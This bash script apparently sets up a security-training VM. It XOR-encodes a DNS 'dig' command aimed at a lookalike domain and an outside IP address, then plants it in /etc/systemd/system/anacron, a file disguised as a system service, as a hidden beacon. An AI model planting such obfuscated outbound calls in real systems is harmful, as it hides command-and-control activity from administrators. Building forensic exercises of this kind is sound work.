#!/bin/bash

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


hacker=`vmtoolsd --cmd "info-get guestinfo.hacker"`

encode_xor() {
    local str="$1"
    local key="$2"
    local encoded=""

    for (( i=0; i<${#str}; i++ )); do
        local current_char_decimal=$(printf '%d' "'${str:$i:1}")
        local xor_result=$(($current_char_decimal ^ $key))
        encoded="${encoded}$(printf '%02x' $xor_result)"
    done

    echo "$encoded"
}

decode_xor() {
    local encoded="$1"
    local key="$2"
    local decoded=""

    for (( i=0; i<${#encoded}; i+=2 )); do
        local byte=${encoded:$i:2}
        local char_decimal=$((0x$byte))
        local xor_result=$(($char_decimal ^ $key))
        decoded="${decoded}$(printf \\$(printf '%03o' $xor_result))"
    done

    echo "$decoded"
}

input_string="dig cmd.canonicalupdates.org @45.79.150.141"
author="written by $hacker"
key=37

# Encode
encoded_str=$(encode_xor "$input_string" "$key")
sed -i "s/REPLACEME/$encoded_str/g" /etc/systemd/system/anacron

encoded_author=$(encode_xor "$author" "$key")
sed -i '/^###/d' /etc/systemd/system/anacron
echo "###$encoded_author" >> /etc/systemd/system/anacron 

# Decode
decoded_str=$(decode_xor "$encoded_str" "$key")
echo -e "Decoded: $decoded_str"

